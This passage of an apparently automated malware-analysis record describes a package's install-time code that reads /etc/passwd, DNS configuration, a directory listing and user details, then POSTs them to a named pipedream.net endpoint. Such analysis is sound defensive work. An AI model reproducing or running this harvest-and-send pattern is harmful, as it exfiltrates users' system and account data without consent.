  "purpose": "Collects detailed system information including hostname, user, DNS servers, directory listing, passwd contents, and OS details, then sends this data to an external server.",
  "sources": "os.getenv('USER') or os.getenv('USERNAME'), open('/etc/resolv.conf'), subprocess.check_output(['ls', '/']), open('/etc/passwd'), os.getcwd()",
  "sinks": "requests.post('https://eowthx8teol6a3s.m.pipedream.net/gmacpyutil')",
  "flows": "Source inputs (environment variables, file reads, subprocess command) -> payload construction -> HTTP POST request to external server",
  "anomalies": "Reads sensitive files ('/etc/passwd'), captures system configuration, and transmits data without user consent or explicit disclosure; no validation or user notification. Usage of open() on system files and collection of passwd contents can be malicious if misused.",
  "analysis": "The code gathers comprehensive system info, including hostname, username, DNS servers, root directory listing, passwd contents, OS info, and current directory. It then sends this data to a remote endpoint via HTTP POST. The data collection includes potentially sensitive information such as user details and system configuration, which may be used for malicious surveillance or reconnaissance. The code executes during package installation, which is a common point for supply chain attacks if malicious. No obfuscation or encryption is used, but the code is straightforward. The external request is to a specific URL, indicating a possible data exfiltration attempt. Overall, this pattern resembles information harvesting intended for malicious or unauthorized purposes.",
  "conclusion": "The code actively collects sensitive system information and transmits it to an external server without user consent, which is suspicious and potentially malicious. It could be used for malicious surveillance, data exfiltration, or reconnaissance in a supply chain attack context.",
